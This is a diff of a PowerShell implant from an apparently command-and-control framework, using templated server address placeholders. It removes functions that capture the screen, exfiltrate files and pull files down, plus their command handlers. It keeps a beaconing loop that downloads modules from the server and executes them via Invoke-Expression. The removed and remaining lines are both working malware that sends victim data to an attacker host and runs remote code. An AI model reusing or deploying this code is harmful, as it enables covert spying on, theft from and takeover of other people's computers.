@@ -49,76 +49,14 @@ else{
 return $u}
 }
 
-function scr($test){
-$temp=$env:temp
-$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
-$File = "$temp\$random.tmp"
-Add-Type -AssemblyName System.Windows.Forms
-Add-type -AssemblyName System.Drawing
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
-$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
-$bitmap.Save($File)
-$file_content = Get-Content $File -Encoding Byte
-$content = enc -key $key -un $file_content -file 1
-
-            $postParams = @{data=":$content`:"}
-            $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
 
 
-$final=[System.Convert]::FromBase64String($content)
-echo $final  | Set-Content $File -Encoding Byte
-rm $File
-return $output
-}
-
-
-      function dn($filename){
-
-                        try{
-
-                  $file_content = Get-Content -LiteralPath $filename -Encoding Byte
-                  if ($file_content.Length -eq 0){
-                  return $Error[0]}
-                  }
-                  catch{
-                  $output = $Error[0] | Out-String;
-                  return $output
-                  }
-            $content = enc -key $key -un $file_content -file 1
-
-
-            $postParams = @{f=$filename;d=$content}
-            $output=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
-            #echo "returned $re.RawContent"
-
-
-            return $output
-            }
-
-
-function up($filename){
-
-$filenameenc=enc -key $key -un $filename
-
-
-$re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{upload}?page=$filenameenc -Method GET
-
-$data=dec -key $key -enc $re.Content -file 1
-
-echo $data | Set-Content $filename -Encoding Byte
-}
-
-
-      function load($module)
+function load($module)
       {
-      #echo "Test"
 
             $modulename = enc -key $key -un $module
             $postParams = @{data=$modulename}
             $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
-            #echo "returned $re.RawContent"
             $modulecontent=dec -key $key -enc $re.Content
 
 
@@ -167,38 +105,11 @@ sleep $beacon
 else{
 $cm=dec -key $key -enc $enc
 
-if($cm.split(" ")[0] -eq "upload"){
-$f=$cm.split(" ")[1]
-$output=up -filename $f
 
-}
 
-elseif($cm.split(" ")[0] -eq "download"){
-echo $cm.split("`"").Length
-if ($cm.split("`"").Length -gt 1)
-{
-$f=$cm.split("`"")[1].split("`"")[0]
-}
-else{
-$f=$cm.split(" ")[1]
-}
-$output=dn -filename $f
-
-}
-elseif($cm.split(" ")[0] -eq "screenshot"){
-$output=scr  -test 0
-Continue
-}
-elseif($cm.split(" ")[0] -eq "set-beacon"){
-$f=$cm.split(" ")[1]
-$beacon=[int]$f
-$output="beacon changed successfully"
-
-}
-elseif($cm.split(" ")[0] -eq "load"){
+if($cm.split(" ")[0] -eq "load"){
 $f=$cm.split(" ")[1]
 $module=load -module $f
-echo "$f $module"
 try{
 $output=Invoke-Expression ($module) -ErrorVariable badoutput | Out-String
         }
